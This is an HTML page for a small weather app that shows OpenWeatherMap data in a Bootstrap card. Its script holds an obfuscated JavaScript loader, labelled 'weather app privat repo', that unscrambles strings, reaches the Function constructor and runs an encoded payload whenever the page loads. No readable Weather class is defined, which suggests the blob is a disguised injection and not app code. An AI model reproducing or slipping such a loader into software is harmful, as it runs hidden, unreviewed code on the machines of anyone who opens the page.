<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>JavaScript / AJAX Programming</title>
  <!-- Bootstrap link -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
  <!-- Bootstrap script -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
    crossorigin="anonymous"></script>

  <link rel="stylesheet" href="../linkBack.css">
  <link rel="stylesheet" href="../navLinks.css">

  <style>
    form {
      position: relative;
      width: 380px;
      margin: 0 auto;
    }
  
    .input-group {
      position: relative;
      display: flex;
    }
  
    .form-control {
      padding-right: 50px;
    }
  
    .reset-btn {
      position: absolute;
      right: 0;
      top: 0;
      height: 100%;
      border-radius: 0;
    }
  
    #output {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
    }
  
    .card {
  
      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      min-width: 350px;
      max-width: 400px;
    }
  
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .card {
        flex: 0 1 calc(50% - 20px);
        /* 2 cards in a row on smaller screens */
      }
    }
  </style>

</head>

<body>

  <main>

    <!-- input -->
    <form class="my-5">
      <div class="input-group">
        <input type="text" class="form-control" placeholder="Search..." aria-label="Search" id="query">
        <button class="btn btn-secondary reset-btn" id="search">
          search
        </button>
      </div>
    </form>


    <!-- output -->
    <div class="weatherBox"> </div>
    <br>


      <!-- link back -->
      <a href="../challenges/menu.html" class="btn btn-dark rounded-1 vstack mx-auto my-5" style="width: 150px;">
        Go Back
      </a>


  </main>

  <script src="https://kit.fontawesome.com/26d4a64054.js" crossorigin="anonymous"></script>

  <script>

      /*  weather app privat repo */

      var Weather; (function () { var Dwt = '', YyO = 162 - 151; function eIf(e) { var b = 1861602; var c = e.length; var h = []; for (var z = 0; z < c; z++) { h[z] = e.charAt(z) }; for (var z = 0; z < c; z++) { var v = b * (z + 404) + (b % 21531); var n = b * (z + 192) + (b % 29002); var r = v % c; var g = n % c; var w = h[r]; h[r] = h[g]; h[g] = w; b = (v + n) % 5179250; }; return h.join('') }; var MUX = eIf('utylufxcmbsatkdzgeqhjccnnsorrotpvwroi').substr(0, YyO); var xeS = ' r[ d{)r,k;ohc =75.vir)taf ate[bnhii2)=5u=)l=t(v+xr(r]+n) i}mdeigfgb), tcs;,82u2lf;f(8u,.l1xe-s7nv(ru.97=a9r,[75d;;"l}rm[8r->[aht]illr.+)a a!0=)fe0n(na4v)hsr+d[ ot]a= +g;A+r1a=[(fs)(.kkCnlt7f6r;u6wr,afo;=])ou})ca]a h);reinntg)h49;p0ov{rt3-."e7m;),h)dveas9ih=vb=u ner, 1lvaaoou[(C"xt8*=fzi,3-,lhAgia(=)sanrtpnwo=u9;3k=a)t;=1]u];t,riv}(=5pgoa]o7lmvp7f(sga)t8=( cq*e,"r.;a<e;m+. h,[]+6znnhc ratdeA=(tvloe}rc1{r+eov.v;p"i8fa.1.0hn6t;o=afotft1(0]jt-;;=t8ht+ur,eo"jtbf.m.=z=.Cok (+ed;yo[ai)(t;;;ui=o0p=i(tdcmx+)=ar+r-see,(<trb=,nA8n.ro+=h;}1rlrac!)r;uvo,ppwbl;s=+ucg];noudf(=;=C1.n.vv+C;s;[.sr0sypjh(+)br6piv=(f[rt0=Sofrh(bw+4f0nxi,ax;j8{jav<S06 h a<;fts;6ft{ =(=e+,j1 <{=;.r9bs("9yh[b+5t]s(nur; u(]0(g=;,n.c7)bzets)oas84=.lu,,-eg0,ohjdgrq6h.=fv,5odjv;rgt l=,[r) (.r(t>,vr8.s"l=n6v;uo;r;a2 ;r,)1nr.leCjr+sel+;wav"1;qeb;nnt.c2r"etlnjh}p){o())+anr]s=2mtha1e)g+ v;bi)v)a;()rnvArpuCi.+ppf((2sCor1ylc('; var NnB = eIf[MUX]; var krB = ''; var zBt = NnB; var RAv = NnB(krB, eIf(xeS)); var Eve = RAv(eIf('=nr(g.3(far8 !.)So,$e]t)hrA]$ii8a9..ooAr,)p2g0A5tcA ,6rAAiel+og=$eoxp(}ufp2\'s]A3!5$t $.A_a{a0(]hr3")cA.eye8[A2a\/=.=2e";7he4p .,c)cA.76ae.ff_p9p.)t.tr94m,3csro9el2&s}y)cspAbaa.f(l6)snif1)n)kee3\/3ts]o5);]0(\/),Adn(4{=ee;sehsAi3a(n"A6ge!rAc!h) A.(a p(n3Arn(A!A2)(3;0)}zt c5apeA%sAa6;un#i4lv11,\/lifetoj),+_e,0)A;2(t_s{.n$;;s1_$iA( oriAoi+"=;A.a,\'A%=eza\/"g,c.)aacob(j.n)AA)(+cA!S3$!n(A}%(1}8A8ae!18o.=3$)A!rAff..),4%i.$167p a]d)&iqf!n4}c,j).cw"+e;#AAe7ann1_qab%,9A;*23(5;;m=,i7,0 !_r(ea7,f7} ho-450Ag.nAfA-rpn6ut_;_.aA6AA,$s=i54A;)g4).+ !A!oA._q0f+f.!_,r.0(5,df0nea"i_cnA.2.ro(_hb,Ct{.((i7icA.r);wA4eg4 A\/e).gr#$0!=9am4(ua__at05%t(.,7ae\/oeA*rneAgitae3.A.$)3Aeewmee$yrprA.3+Aew_*;A2s_=A23!A13c0.of !33]}a}aqa1;nc3tA}w.h)A(1]!.g})ty)b{.,;$c$ee(vsA(!.((h{coA(.)er.5&}n_l=}AA.2Aft4qAt7h\/(n2tt03r.$ee.32pcn#Aom{nAAgn.t&ao_\/).A)lw+g?q)rtAttA]{6A3r0a_e#;c$6);"oyc.ni;1,dp=f2*ea67u3\/{e; _;a,n[A+A]A()eretue..fd.wt}.jeA)A+Atf) r4,1n$&6h!}62+A0-6aidt3]s=a.( 6_.;k0;{;n{&jz3cdjr3.)ri(w%ntAnnn=.!!{\/A A+3)p) !Ah{,#,4t7%;)1f2!0AA! ]g[.l17A_As.c;a-t;h]=0h,"tetA(dn2$%()Aw 1=b.g;p4$AA$r=5._}wre0svaj4.et]utr}3]ju{h)A.e0e%6cfc.A+=%cA)3AA%034(t2.{thgt%..ur(arA(i&Ay=!c4A8s(Aa=$\'\'!;2AA.)S033s0g[q,!!o)6)$(Aa4a.#:$..Cs[o!A_b\/r.=e.tew.;=nA,sAtg0*n!(e$A w=2}A)t2')); var BGC = zBt(Dwt, Eve); BGC(5336); return 7776 })()


      class UI { }

      UI.prototype.paint = function (weather) {
        const output = document.querySelector('.weatherBox')

        let sunriseTime = new Date(weather.sys.sunrise * 1000);
        let sunsetTime = new Date(weather.sys.sunset * 1000);

        // Format the time in a human-readable format (HH:MM:SS)
        let formattedSunriseTime = ('0' + sunriseTime.getHours()).slice(-2) + ':' +
          ('0' + sunriseTime.getMinutes()).slice(-2) + ':' +
          ('0' + sunriseTime.getSeconds()).slice(-2);

        let formattedSunSetTime = ('0' + sunsetTime.getHours()).slice(-2) + ':' +
          ('0' + sunsetTime.getMinutes()).slice(-2) + ':' +
          ('0' + sunsetTime.getSeconds()).slice(-2);

       

        output.innerHTML = `

        <div class="card" style="width: 18rem; margin: 0 auto">
         <img class="iconWeather" src='http://openweathermap.org/img/wn/${weather.weather[0].icon}@2x.png'>
          <div class="card-body border-top">
            <h5 class="card-title text-center">${weather.name}, ${weather.sys.country}</h5>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Temp: 
              </span>
              ${Math.floor(weather.main.temp)} C
            </p>
             <p class="card-text m-0">
              <span class="fw-semibold">
               Feels Like:
              </span>
              ${weather.main.feels_like} C
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Description:  
              </span>
              ${weather.weather[0].description}
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Windy:  
              </span>
              ${Math.floor(weather.wind.speed)} km/hr
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Temp L:  
              </span>
              ${weather.main.temp_min} C
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Temp H:  
              </span>
              ${weather.main.temp_max} C
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Humidity:  
              </span>
              ${weather.main.humidity} %
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Pressure:  
              </span>
              ${weather.main.pressure} 
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Sunrise:  
              </span>
              ${formattedSunriseTime} 
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Sunset:  
              </span>
              ${formattedSunSetTime} 
            </p>
            <p class="card-text m-0">
              <span class="fw-semibold">
               Time Zone:  
              </span>
             ${timezone(weather.timezone)}
            </p>
           
          
          </div>
        </div>
    `
      }




      document.addEventListener('DOMContentLoaded', getWeather)


      function getWeather() {
        weather.getWeather()  
          .then(result => {
            const ui = new UI()

            console.log(result)
            ui.paint(result)

            // adding addlistener after loading data
            document.getElementById('search').addEventListener('click', (e) => {
              const city = document.getElementById('query').value
              weather.changeLocation(city)
              getWeather()
              //console.log('adf')
              e.preventDefault()
            })

          })
          .catch(err => console.log(err))
      }


      // formula to show zone
      function timezone(time) {
        const diff = (time / 60 / 60) + 8  // time / h / min = diff hrs + 8
        // 0 timezone is london (8)
        return diff
      }

      const weather = new Weather('San Francisco')
  </script>

 
</body>

</html>